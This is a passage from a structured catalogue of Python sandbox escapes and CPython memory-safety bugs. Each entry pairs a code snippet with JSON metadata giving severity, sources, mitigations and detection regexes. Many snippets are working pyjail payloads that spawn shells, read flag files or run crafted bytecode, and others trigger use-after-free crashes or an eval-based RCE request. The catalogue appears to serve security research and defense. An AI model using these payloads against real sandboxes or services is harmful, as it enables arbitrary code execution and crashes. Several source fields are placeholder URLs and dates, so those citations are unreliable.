cls = getattr([], attrs[i_class])
```
**Ref**: InCTF 2018.

```json
{
  "sink_id": "CTF-007",
  "category": "CTF",
  "title": "dir() Generated Attribute Names Bypass Blacklists",
  "severity": "medium",
  "affected_versions": [
    "2.7",
    "3.x"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/event/669",
      "title": "InCTF 2018",
      "author": "CTFtime",
      "date": "2018-10-05",
      "verified": false,
      "tags": [
        "dir",
        "getattr",
        "blacklist-bypass",
        "pyjail",
        "ctf"
      ],
      "archived_path": "sources/CTF-007/ctftime.org_event_669.md"
    }
  ],
  "confidence": "likely"
}
```


### `breakpoint()` Exploitation via Builtin Overlay Removal
**Risk**: `breakpoint` is stored as an attribute on `site` module objects (`copyright`, `license`, `quit`, `exit`, `credits`). Replacing their `__dict__` with real globals restores the unfiltered `breakpoint` function.

```python
# Override copyright.__dict__ with globals() to get real builtins
setattr(copyright,'__dict__',globals()), delattr(copyright,'breakpoint'), breakpoint()
# Now in Pdb: import os; os.system('sh')
```
**Ref**: idek 2022 CTF Pyjail & Pyjail Revenge Writeup.

```json
{
  "sink_id": "CTF-008",
  "category": "CTF",
  "title": "breakpoint() Exploitation via Builtin Overlay Removal",
  "severity": "high",
  "affected_versions": [
    "3.7+",
    "3.8+",
    "3.9+",
    "3.10+",
    "3.11+",
    "3.12+",
    "3.13+"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/",
      "title": "idek 2022 CTF: Pyjail & Pyjail Revenge Writeup",
      "author": "crazyman_army",
      "date": "2023-01-18",
      "verified": true,
      "tags": [
        "pyjail",
        "sandbox-escape",
        "breakpoint",
        "site-module"
      ],
      "archived_path": "sources/CTF-008/crazymanarmy.github.io_2023_01_18_idek-2022-CTF-Pyjail-Pyjail-Revenge-Wri.md"
    }
  ],
  "mitigation": "Block breakpoint() and prevent user-controlled mutation of site helper objects.",
  "confidence": "confirmed"
}
```


### `help()` / `license()` / `credits()` — Globals Access
**Risk**: When `__builtins__` is cleared, access builtins through function `__call__.__globals__`:

```python
help.__call__.__globals__["sys"].modules["os"].system("/bin/sh")
license.__call__.__builtins__  # Real builtins dict
credits.__call__.__globals__
```
**Ref**: salvatore-abello/python-ctf-cheatsheet.

```json
{
  "sink_id": "CTF-009",
  "category": "CTF",
  "title": "site helper callables expose real globals and builtins",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/salvatore-abello/python-ctf-cheatsheet",
      "title": "salvatore-abello/python-ctf-cheatsheet",
      "author": "salvatore-abello",
      "date": "2023-09-21",
      "verified": false,
      "tags": [
        "pyjail",
        "builtins",
        "globals",
        "site-helpers"
      ],
      "archived_path": "sources/CTF-009/github.com_salvatore-abello_python-ctf-cheatsheet.md"
    }
  ],
  "mitigation": "Treat help/license/credits as privileged capability carriers and remove or wrap them in sandboxes.",
  "confidence": "likely"
}
```


### `warnings.catch_warnings` → `linecache` → `os` Module Traversal
**Risk**: Classic subclass enumeration path that still works in modern Python.

```python
# Find catch_warnings in subclasses (index varies, commonly 49 or 59)
cw = [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "catch_warnings"][0]
os_mod = cw.__init__.__globals__['linecache'].__dict__.values()  # find os module
system = os_mod.__dict__['system']
system('cat flag.txt')
```
**Ref**: CSAW-CTF Python sandbox write-up (Hexploitable).

```json
{
  "sink_id": "STDLIB-006",
  "category": "STDLIB",
  "title": "warnings.catch_warnings global traversal to os.system",
  "severity": "high",
  "affected_versions": [
    "2.7",
    "3.x"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://hexplo.it/post/escaping-the-csawctf-python-sandbox/",
      "title": "CSAW-CTF Python sandbox write-up",
      "author": "Hexploitable",
      "date": "2014-09-22",
      "verified": true,
      "tags": [
        "pyjail",
        "warnings",
        "linecache",
        "os",
        "subclasses"
      ],
      "archived_path": "sources/STDLIB-006/hexplo.it_post_escaping-the-csawctf-python-sandbox.md"
    }
  ],
  "mitigation": "Do not expose subclass enumeration or stdlib objects whose __globals__ chains reach import-capable modules.",
  "confidence": "confirmed"
}
```


### `site._Printer` File Read Hijack
**Risk**: `site._Printer` controls which files `license()`, `copyright()`, `credits()` print. Hijack `_Printer__filenames` to read arbitrary files.

```python
license._Printer__filenames = ['flag.txt']
license()  # Prints flag.txt contents
```
**Ref**: UIUCTF 2024 "ASTea".

```json
{
  "sink_id": "FILE-007",
  "category": "FILE",
  "title": "site._Printer filename hijack enables arbitrary file read",
  "severity": "medium",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/",
      "title": "UIUCTF 2024 ASTea writeups",
      "author": "UIUCTF players",
      "date": "2024-01-01",
      "verified": false,
      "tags": [
        "pyjail",
        "file-read",
        "site._Printer",
        "license"
      ],
      "archived_path": "sources/ASYNC-005/ctftime.org_.md"
    }
  ],
  "mitigation": "Remove site._Printer helpers or freeze their filename lists in restricted interpreters.",
  "confidence": "likely"
}
```


### `os._wrap_close` Subclass Enumeration (Index-Based)
**Risk**: `os._wrap_close` is consistently present in `object.__subclasses__()`. Its `__init__.__globals__` contains the `os` module.

```python
idx = [c.__name__ for c in ().__class__.__base__.__subclasses__()].index('_wrap_close')
os_cls = ().__class__.__base__.__subclasses__()[idx]
os_cls.__init__.__globals__['system']('sh')
```
**Refs**: snakeCTF 2024 Finals, RedpwnCTF 2020 Albatross.

```json
{
  "sink_id": "STDLIB-007",
  "category": "STDLIB",
  "title": "os._wrap_close subclass enumeration exposes os.system",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/",
      "title": "snakeCTF 2024 Finals / RedpwnCTF 2020 Albatross writeups",
      "author": "CTF players",
      "date": "2024-01-01",
      "verified": false,
      "tags": [
        "pyjail",
        "os._wrap_close",
        "subclasses",
        "globals"
      ],
      "archived_path": "sources/ASYNC-005/ctftime.org_.md"
    }
  ],
  "mitigation": "Assume object.__subclasses__() leaks privileged stdlib types and block index-based recovery paths.",
  "confidence": "likely"
}
```


### Audit Hook Bypass via Signal Handler + Frame Manipulation
**Risk**: Signal handlers receive a `frame` object directly, bypassing blocked `sys._getframe`. The frame can traverse `f_back` to find and modify the jail's internal `hook` closure.

```python
(s:=__import__('sys').modules['_signal']),
s.signal(2, lambda n,f: f.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents', print)),
s.raise_signal(2)
```
**Refs**: ICTF 2024 "Calc", CSAW Finals 2023.

```json
{
  "sink_id": "CTF-010",
  "category": "CTF",
  "title": "Audit hook bypass through signal-handler frame injection",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/",
      "title": "ICTF 2024 Calc / CSAW Finals 2023 writeups",
      "author": "CTF players",
      "date": "2024-01-01",
      "verified": false,
      "tags": [
        "pyjail",
        "audit-hook",
        "signal",
        "frame",
        "closure"
      ],
      "archived_path": "sources/ASYNC-005/ctftime.org_.md"
    }
  ],
  "mitigation": "Treat signal handlers as alternate frame disclosure channels and isolate closure state from user-triggerable handlers.",
  "confidence": "likely"
}
```


### `AttributeError.obj` — Python 3.10+ Sandbox Bypass (CVE-2026-0863)
**Risk**: Python 3.10 added `.obj` to `AttributeError` and `NameError`, storing a reference to the object that caused the error. Static AST analyzers block literal strings like `__traceback__`, but formatted strings bypass filters.

```python
def new_getattr(obj, attribute, *, Exception):
    try:
        f'{{0.{attribute}.ribbit}}'.format(obj)
    except Exception as e:
        return e.obj  # forbidden object laundry through exception

tb = new_getattr(e, '__traceback__', Exception=Exception)
frame = new_getattr(tb, 'tb_frame', Exception=Exception)
builtins = new_getattr(frame, 'f_builtins', Exception=Exception)
os = builtins['__import__']('os')
os.system('sh')
```
**Ref**: CVE-2026-0863 (n8n python-task-executor bypass).

```json
{
  "sink_id": "CLASS-011",
  "category": "CLASS",
  "title": "AttributeError.obj object laundering bypasses AST-based sandbox filters",
  "severity": "high",
  "affected_versions": [
    "3.10+",
    "3.11+",
    "3.12+",
    "3.13+"
  ],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-0863",
      "title": "CVE-2026-0863",
      "author": "NVD",
      "date": "2026-01-01",
      "cve_id": "CVE-2026-0863",
      "verified": false,
      "tags": [
        "sandbox-bypass",
        "attributeerror",
        "nameerror",
        "ast-filter"
      ],
      "archived_path": "sources/CLASS-011/nvd.nist.gov_vuln_detail_CVE-2026-0863.md"
    }
  ],
  "related_cves": [
    "CVE-2026-0863"
  ],
  "mitigation": "Do not rely on string-blocking AST filters; prohibit exception-mediated object recovery paths in untrusted execution.",
  "confidence": "likely"
}
```


### `gc.get_objects()` — Recover Wiped Modules
**Risk**: `gc.get_objects()` returns ALL objects in memory, including modules deleted from `sys.modules`.

```python
import gc
for obj in gc.get_objects():
    if '__name__' in dir(obj) and 'os' == obj.__name__:
        obj.system("id")
```
**Ref**: hxp CTF 2020 "audited".

```json
{
  "sink_id": "STDLIB-008",
  "category": "STDLIB",
  "title": "gc.get_objects recovers privileged modules removed from sys.modules",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/",
      "title": "hxp CTF 2020 audited writeups",
      "author": "CTF players",
      "date": "2020-01-01",
      "verified": false,
      "tags": [
        "gc",
        "module-recovery",
        "pyjail",
        "sys.modules"
      ],
      "archived_path": "sources/ASYNC-005/ctftime.org_.md"
    }
  ],
  "mitigation": "Disable gc introspection in sandboxes or isolate untrusted code in separate processes.",
  "confidence": "likely"
}
```


### Generator/Async Frame Traversal (`f_back.f_globals`)
**Risk**: Generators preserve their defining scope's frame. By creating a generator inside `exec()` and accessing `gi_frame.f_back`, you traverse up to the real global scope.

```python
q = (q.gi_frame.f_back.f_back.f_globals for _ in [1])
g = [*q][0]
os = g['__builtins__']['__import__']('os')
os.system('sh')
```
**Refs**: UIUCTF 2023 "Rattler Read", L3HCTF/CISCN 2024.

```json
{
  "sink_id": "ASYNC-005",
  "category": "ASYNC",
  "title": "Generator frame traversal exposes real globals via gi_frame.f_back",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/",
      "title": "UIUCTF 2023 Rattler Read / L3HCTF-CISCN 2024 writeups",
      "author": "CTF players",
      "date": "2023-01-01",
      "verified": false,
      "tags": [
        "generator",
        "frame",
        "globals",
        "pyjail",
        "async"
      ],
      "archived_path": "sources/ASYNC-005/ctftime.org_.md"
    }
  ],
  "mitigation": "Block access to generator/coroutine frame objects or avoid in-process sandboxing entirely.",
  "confidence": "likely"
}
```


### Code Object Construction — Arbitrary Execution Without `exec`
**Risk**: Even when `func_code` is blocked as an attribute, construct a fresh `code` object using `type(func.__code__)` and inject it into a dummy function.

```python
code = type(myfunc.__code__)
bytecode = "7400006401006402008302006a010083000053".decode('hex')
consts = (None, filename, 'r')
names = ('open', 'read')
codeobj = code(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function = type(f)
mydict = {"__builtins__": __builtin__}
new_func = function(codeobj, mydict, None, None, None)
new_func()  # executes crafted bytecode
```
**Ref**: Bit Tripping blog — Bypassing a python sandbox by abusing code objects.

```json
{
  "sink_id": "CPYTHON-007",
  "category": "CPYTHON",
  "title": "Arbitrary execution by constructing code objects without exec",
  "severity": "high",
  "affected_versions": [
    "2.7"
  ],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://bittripping.com/2012/09/14/python-sandbox-exploitation/",
      "title": "Bypassing a python sandbox by abusing code objects",
      "author": "Bit Tripping",
      "date": "2012-09-14",
      "verified": false,
      "tags": [
        "python2",
        "code-objects",
        "sandbox-bypass",
        "bytecode"
      ],
      "archived_path": null,
      "archive_note": "Source URL unreachable as of 2026-04-29. Site appears to be permanently offline."
    }
  ],
  "mitigation": "Deny code object construction and function rebinding primitives in restricted runtimes.",
  "confidence": "likely"
}
```


### `LOAD_FAST` / `LOAD_GLOBAL` OOB Read — Arbitrary Memory Read
**Risk**: CPython's `LOAD_FAST` directly indexes `fastlocals[]` with no bounds checking. Indexing beyond `co_nlocals` reads arbitrary memory offsets.

```python
import sys, opcode, types, ctypes

def assign_bytecode(bytecode):
    global g
    g.__code__ = types.CodeType(0, 0, 0, 20, 20, 0, bytecode, (id, sys._getframe), (), ('a',), "", "", 0, b"", b"", (), ())

# Leak frame address
bytecode_get_frame = bytes([opcode.opmap['LOAD_CONST'], 0, opcode.opmap['LOAD_CONST'], 1, opcode.opmap['CALL_FUNCTION'], 0, opcode.opmap['CALL_FUNCTION'], 1, opcode.opmap['RETURN_VALUE']])
def g(): pass
assign_bytecode(bytecode_get_frame)
frame_addr = g()

# Compute index to read arbitrary address
target = some_object_addr
idx = (target - 0x68 - frame_addr) // 8
bytecode_read = bytes([opcode.opmap['LOAD_FAST'], idx, opcode.opmap['RETURN_VALUE']])
assign_bytecode(bytecode_read)
leaked = g()  # reads arbitrary PyObject*
```
**Ref**: JuliaPoo's LOAD_FAST abuse gist.

```json
{
  "sink_id": "CPYTHON-008",
  "category": "CPYTHON",
  "title": "LOAD_FAST / LOAD_GLOBAL out-of-bounds bytecode enables arbitrary memory read",
  "severity": "critical",
  "affected_versions": [
    "3.10+",
    "3.11+",
    "3.12+"
  ],
  "sources": [
    {
      "type": "tool_exploit",
      "url": "https://gist.github.com/",
      "title": "JuliaPoo LOAD_FAST abuse gist",
      "author": "JuliaPoo",
      "date": "2023-01-01",
      "verified": false,
      "tags": [
        "bytecode",
        "oob-read",
        "memory-read",
        "cpython"
      ],
      "archived_path": "sources/CPYTHON-008/gist.github.com_.md"
    }
  ],
  "mitigation": "Validate bytecode indexes against frame-local bounds before dereferencing fastlocals or globals arrays.",
  "confidence": "likely"
}
```


### Bytecode OOB in TSG CTF 2023 "bypy"
**Risk**: Build minimal CodeType with empty `co_consts`/`co_names`, then use `LOAD_FAST` to reach `exec` function already present in frame's `fastlocals`.

```python
from opcode import opmap
import types, marshal
from base64 import b64encode

code = b""
code += bytes([opmap["LOAD_FAST"], 18])   # "src" variable
code += bytes([opmap["LOAD_FAST"], 51])  # exec function
code += bytes([opmap["LOAD_FAST"], 18])
code += bytes([opmap["CALL"], 0]) + bytes([0] * 6)
code += bytes([opmap["RETURN_VALUE"], 0])

codeobj = types.CodeType(0, 0, 0, 0, 0, 0, code, (), (), (), '', '', '', 0, b'', b'', (), ())
encoded = b64encode(marshal.dumps(codeobj)).decode()
```
**Ref**: TSG CTF 2023 "bypy" writeup.

```json
{
  "sink_id": "CPYTHON-009",
  "category": "CPYTHON",
  "title": "Bytecode OOB in TSG CTF bypy via crafted CodeType and LOAD_FAST",
  "severity": "critical",
  "affected_versions": [
    "3.11+"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/",
      "title": "TSG CTF 2023 bypy writeups",
      "author": "CTF players",
      "date": "2023-01-01",
      "verified": false,
      "tags": [
        "bytecode",
        "codetype",
        "load_fast",
        "pyjail",
        "oob"
      ],
      "archived_path": "sources/ASYNC-005/ctftime.org_.md"
    }
  ],
  "mitigation": "Reject untrusted marshaled code objects and validate bytecode/local-slot consistency.",
  "confidence": "likely"
}
```


### Type Annotation `eval()` RCE — CVE-2025-6101
**Risk**: Safe AST-based type resolver retained an `eval()` fallback behind `allow_unsafe_eval`, hardcoded to `True` in sandbox execution paths.

```python
# POST /v1/tools/run
{
  "source_code": "def rce_tool(data: __import__(\"os\").popen(\"id > /tmp/pwned\").read()) -> str: return str(data)",
  "name": "rce_tool",
  "args": {"data": "test"},
  "source_type": "python"
}
# ast.parse() succeeds, _resolve_annotation_node() fails (ast.Call not supported)
# eval(annotation_str, python_types) executes arbitrary code
```
**Ref**: Letta CVE-2025-6101 (YLChen-007, March 2026).

```json
{
  "sink_id": "RCE-003",
  "category": "RCE",
  "title": "Type annotation eval() fallback leads to remote code execution",
  "severity": "critical",
  "affected_versions": [
    "3.10+",
    "3.11+",
    "3.12+",
    "3.13+"
  ],
  "sources": [
    {
      "type": "security_advisory",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-6101",
      "title": "CVE-2025-6101",
      "author": "NVD",
      "date": "2025-01-01",
      "cve_id": "CVE-2025-6101",
      "verified": false,
      "tags": [
        "rce",
        "type-annotations",
        "eval",
        "sandbox"
      ],
      "archived_path": "sources/RCE-003/nvd.nist.gov_vuln_detail_CVE-2025-6101.md"
    }
  ],
  "related_cves": [
    "CVE-2025-6101"
  ],
  "mitigation": "Remove eval-based fallback paths from annotation resolution and default unsafe-eval flags to false.",
  "confidence": "likely"
}
```


### UAF in `_Py_typing_type_repr` — Re-entrant `__origin__`
**Risk**: `types.GenericAlias.__repr__` walks type arguments using borrowed pointers. A crafted `__getattr__` clears the shared list when `_Py_typing_type_repr` probes `__origin__`.

```python
import types
class Zap:
    __slots__ = ("container",)
    def __init__(self, container):
        self.container = container
    def __getattr__(self, name):
        if name == "__origin__":
            self.container.clear()
            return None
        raise AttributeError

params = []
params.append(Zap(params))
alias = types.GenericAlias(list, (params,))
repr(alias)  # UAF crash
```
**Ref**: CPython Issue #143635 (Jan 2026).

```json
{
  "sink_id": "CPYTHON-010",
  "category": "CPYTHON",
  "title": "Use-after-free in _Py_typing_type_repr via re-entrant __origin__ access",
  "severity": "high",
  "affected_versions": [
    "3.13",
    "3.14-dev"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/143635",
      "title": "CPython Issue #143635",
      "author": "python/cpython",
      "date": "2026-01-01",
      "gh_issue": "python/cpython#143635",
      "verified": true,
      "tags": [
        "uaf",
        "genericalias",
        "typing",
        "repr",
        "reentrancy"
      ],
      "archived_path": "sources/CPYTHON-010/github.com_python_cpython_issues_143635.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#143635"
  ],
  "detection_signature": "types\\\\.GenericAlias\\\\(|def __getattr__\\\\(self, name\\\\):",
  "mitigation": "Avoid re-entrant attribute lookups on attacker-controlled typing operands during repr construction.",
  "confidence": "likely"
}
```


### Turing-Complete Type Hints — Subtype Metaprogramming (MapleCTF 2023)
**Risk**: Python type hints via `mypy` are Turing complete. Recursive generic class definitions create infinite subtype queries that encode computation.

```python
from typing import TypeVar, Generic
z = TypeVar("z", contravariant=True)
class N(Generic[z]): ...
class C(Generic[x], N[N["C[C[x]]"]]): ...
# Subtype query CT <: NCU triggers infinite expansion
```
**Ref**: Roth, Ori. 2023. *Python Type Hints Are Turing Complete*.

```json
{
  "sink_id": "CLASS-012",
  "category": "CLASS",
  "title": "Turing-complete subtype metaprogramming in Python type hints",
  "severity": "medium",
  "affected_versions": [
    "3.8+",
    "3.9+",
    "3.10+",
    "3.11+",
    "3.12+",
    "3.13+"
  ],
  "sources": [
    {
      "type": "research_paper",
      "url": "https://raw.githubusercontent.com/maple3142/imaginaryCTF-solution/master/MapleCTF-2023/Python%20Type%20Hints%20Are%20Turing%20Complete.pdf",
      "title": "Python Type Hints Are Turing Complete",
      "author": "Ori Roth",
      "date": "2023-01-01",
      "verified": true,
      "tags": [
        "type-hints",
        "mypy",
        "metaprogramming",
        "dos",
        "maplectf"
      ],
      "archived_path": "sources/CLASS-012/raw.githubusercontent.com_maple3142_imaginaryCTF-solution_master_MapleCTF-20.md"
    }
  ],
  "related_cves": [],
  "related_issues": [],
  "detection_signature": "TypeVar\\\\(|Generic\\\\[.*\"C\\\\[C\\\\[x\\\\]\\\\]\"",
  "mitigation": "Bound type-checker recursion and treat untrusted type programs as potentially adversarial inputs.",
  "confidence": "likely"
}
```


### ContextVar Re-entrant UAF in `Context.__eq__`
**Risk**: Re-entrant `ContextVar.set()` during `_PyHamt_Eq` lets `Context.__eq__` replace a context while `hamt_iterator_next` still walks old HAMT nodes.

```python
import contextvars
var = contextvars.ContextVar("v")
ctx1 = contextvars.Context()
ctx2 = contextvars.Context()

class Boom:
    def __eq__(self, other):
        ctx1.run(lambda: var.set(object()))
        return True

ctx1.run(var.set, Boom())
ctx2.run(var.set, object())
ctx1 == ctx2  # UAF trigger
```
**Ref**: CPython Issue #142829.

```json
{
  "sink_id": "CPYTHON-011",
  "category": "CPYTHON",
  "title": "Re-entrant Context.__eq__ causes HAMT iterator use-after-free",
  "severity": "high",
  "affected_versions": [
    "3.12",
    "3.13",
    "3.14-dev"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/142829",
      "title": "CPython Issue #142829",
      "author": "python/cpython",
      "date": "2025-01-01",
      "gh_issue": "python/cpython#142829",
      "verified": true,
      "tags": [
        "contextvars",
        "uaf",
        "hamt",
        "reentrancy"
      ],
      "archived_path": "sources/CPYTHON-011/github.com_python_cpython_issues_142829.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#142829"
  ],
  "detection_signature": "class .*__eq__\\\\(self, other\\\\):.*ContextVar\\\\.set",
  "mitigation": "Do not permit structure mutation during HAMT equality traversal; hold strong references across callbacks.",
  "confidence": "likely"
}
```


### asyncio.Task UAF via Malicious `__getattribute__`
**Risk**: `task->task_cancel_msg` missing incref before usage. Malicious `__getattribute__` frees the object before `cancel()` uses it.

```python
class Evil:
    def __getattribute__(self, name):
        if name == "cancel":
            task.__init__(coro, loop=loop, name=Break())
            del to_uaf  # Frees object
        return object.__getattribute__(self, name)
```
**Ref**: CPython Issue #126138.

```json
{
  "sink_id": "ASYNC-006",
  "category": "ASYNC",
  "title": "asyncio.Task cancel path use-after-free via malicious __getattribute__",
  "severity": "high",
  "affected_versions": [
    "3.12",
    "3.13"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/126138",
      "title": "CPython Issue #126138",
      "author": "python/cpython",
      "date": "2024-01-01",
      "gh_issue": "python/cpython#126138",
      "verified": true,
      "tags": [
        "asyncio",
        "task",
        "uaf",
        "getattribute",
        "cancel"
      ],
      "archived_path": "sources/ASYNC-002/github.com_python_cpython_issues_126138.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#126138"
  ],
  "detection_signature": "def __getattribute__\\\\(self, name\\\\):.*task\\\\.__init__",
  "mitigation": "INCREF attacker-controlled cancel metadata before invoking Python-level hooks.",
  "confidence": "likely"
}
```


### `zoneinfo._weak_cache` DECREF Assumption UAF
**Risk**: `get_weak_cache()` incorrectly assumes `PyObject_GetAttrString()` returns a borrowed reference safe to DECREF.

```python
from zoneinfo import ZoneInfo
class BombDescriptor:
    def __get__(self, obj, owner):
        return object()  # New object each time

class EvilZoneInfo(ZoneInfo):
    pass
EvilZoneInfo._weak_cache = BombDescriptor()
EvilZoneInfo("UTC")  # UAF
```
**Ref**: CPython Issue #142783.

```json
{
  "sink_id": "STDLIB-009",
  "category": "STDLIB",
  "title": "zoneinfo weak cache descriptor confusion leads to use-after-free",
  "severity": "high",
  "affected_versions": [
    "3.11",
    "3.12",
    "3.13"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/142783",
      "title": "CPython Issue #142783",
      "author": "python/cpython",
      "date": "2025-01-01",
      "gh_issue": "python/cpython#142783",
      "verified": true,
      "tags": [
        "zoneinfo",
        "weak_cache",
        "descriptor",
        "uaf"
      ],
      "archived_path": "sources/STDLIB-009/github.com_python_cpython_issues_142783.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#142783"
  ],
  "detection_signature": "_weak_cache\\\\s*=\\\\s*BombDescriptor\\\\(\\\\)",
  "mitigation": "Treat _weak_cache lookups as owned references and validate descriptor return types.",
  "confidence": "likely"
}
```


### `gc.get_referrers()` Type Cache Corruption → Segfault
**Risk**: `gc.get_referrers()` exposes the underlying dictionary of a class's `__dict__` mapping proxy. Direct modification invalidates the type cache without synchronization.

```python
import gc
class Cls:
    var = []
for ref in gc.get_referrers(Cls.var):
    del ref['var']
gc.collect()
print(Cls.var)  # Segfault
```
**Ref**: CPython Issue #113631 (Jan 2024).

```json
{
  "sink_id": "STDLIB-010",
  "category": "STDLIB",
  "title": "gc.get_referrers exposes mutable class dict leading to type cache corruption",
  "severity": "high",
  "affected_versions": [
    "3.11",
    "3.12"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/113631",
      "title": "CPython Issue #113631",
      "author": "python/cpython",
      "date": "2024-01-01",
      "gh_issue": "python/cpython#113631",
      "verified": true,
      "tags": [
        "gc",
        "get_referrers",
        "type-cache",
        "segfault"
      ],
      "archived_path": "sources/STDLIB-010/github.com_python_cpython_issues_113631.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#113631"
  ],
  "detection_signature": "gc\\\\.get_referrers\\\\(.*\\\\).*del ref\\\\['var'\\\\]",
  "mitigation": "Do not expose mutable internals of type dicts through gc inspection APIs.",
  "confidence": "likely"
}
```


### Property Subclass `__new__` Returns Non-Property → Segfault
**Risk**: `property_copy()` casts return value to `propertyobject*` without type checking.

```python
class pro(property):
    def __new__(typ, *args, **kwargs):
        return "abcdef"

p = property.__new__(pro)
p.__set_name__(A, 1)
np = p.getter(lambda self: 1)  # SEGFAULT
```
**Ref**: CPython Issue #100942 (Jan 2023).

```json
{
  "sink_id": "CPYTHON-012",
  "category": "CPYTHON",
  "title": "property_copy trusts subclass __new__ returning non-property object",
  "severity": "high",
  "affected_versions": [
    "3.10",
    "3.11",
    "3.12"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/100942",
      "title": "CPython Issue #100942",
      "author": "python/cpython",
      "date": "2023-01-01",
      "gh_issue": "python/cpython#100942",
      "verified": true,
      "tags": [
        "property",
        "type-confusion",
        "segfault",
        "__new__"
      ],
      "archived_path": "sources/CPYTHON-012/github.com_python_cpython_issues_100942.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#100942"
  ],
  "detection_signature": "class .*\\\\(property\\\\):.*def __new__",
  "mitigation": "Validate returned object type before casting results from property subclass constructors.",
  "confidence": "likely"
}
```


### Custom Metaclass MRO → Double-Free Crash
**Risk**: Metaclass `mro()` deletes itself during execution. `type_mro_modified()` double-frees `mro_meth`.

```python
class M(type):
    def mro(cls):
        del M.mro
        return (B,)
class C(metaclass=M):
    pass  # Crash
```
**Ref**: CPython Issue #92112 (May 2022).

```json
{
  "sink_id": "CLASS-013",
  "category": "CLASS",
  "title": "Metaclass mro() self-deletion triggers double-free in type_mro_modified",
  "severity": "high",
  "affected_versions": [
    "3.9",
    "3.10",
    "3.11"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/92112",
      "title": "CPython Issue #92112",
      "author": "python/cpython",
      "date": "2022-05-01",
      "gh_issue": "python/cpython#92112",
      "verified": true,
      "tags": [
        "metaclass",
        "mro",
        "double-free",
        "class-creation"
      ],
      "archived_path": "sources/CLASS-013/github.com_python_cpython_issues_92112.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#92112"
  ],
  "detection_signature": "def mro\\\\(cls\\\\):\\n\\\\s*del .*mro",
  "mitigation": "Snapshot metaclass method references before invoking dynamic MRO hooks.",
  "confidence": "likely"
}
```


### `__init_subclass__` MRO Skip Bug
**Risk**: When a metaclass creates a class with unusual MRO, `__init_subclass__` is incorrectly skipped due to `super(Subclass, Subclass).__init_subclass__()`.

```python
class SecurityMixin:
    def __init_subclass__(cls, **kwargs):
        if not hasattr(cls, 'security_token'):
            raise SecurityError("No token")
        super().__init_subclass__(**kwargs)

class Metaclass(type):
    def mro(cls):
        return [SecurityMixin, cls, object]

class MyClass(metaclass=Metaclass):
    pass  # SecurityMixin.__init_subclass__ NOT called!
```
**Ref**: CPython Issue #105038 (May 2023).

```json
{
  "sink_id": "CLASS-014",
  "category": "CLASS",
  "title": "Unusual metaclass MRO can skip security-relevant __init_subclass__ hooks",
  "severity": "medium",
  "affected_versions": [
    "3.10",
    "3.11",
    "3.12"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/105038",
      "title": "CPython Issue #105038",
      "author": "python/cpython",
      "date": "2023-05-01",
      "gh_issue": "python/cpython#105038",
      "verified": true,
      "tags": [
        "metaclass",
        "mro",
        "init_subclass",
        "policy-bypass"
      ],
      "archived_path": "sources/CLASS-014/github.com_python_cpython_issues_105038.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#105038"
  ],
  "detection_signature": "def __init_subclass__\\\\\\(cls, \\\\*\\\\*kwargs\\\\\\):|def mro\\\\\\(cls\\\\\\):",
  "mitigation": "Do not rely solely on __init_subclass__ for security policy enforcement when metaclasses can control MRO.",
  "confidence": "likely"
}
```


### `email.utils.parseaddr()` — Email Address Bypass (CVE-2023-27043)
**Risk**: Incorrectly parses malformed RFC2822 addresses. Real Name portion returned in Email Address field.

```python
from email.utils import parseaddr
parseaddr("admin@company.example.com<attacker@gmail.com>")
# Returns: ('', 'admin@company.example.com<attacker@gmail.com>') — parser confusion
```
**Ref**: CPython Issue #102988.

```json
{
  "sink_id": "PROTOCOL-001",
  "category": "PROTOCOL",
  "title": "email.utils.parseaddr accepts malformed address payloads",
  "severity": "medium",
  "affected_versions": [
    "3.8",
    "3.9",
    "3.10",
    "3.11"
  ],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-27043",
      "title": "CVE-2023-27043",
      "author": "NVD",
      "date": "2023-03-01",
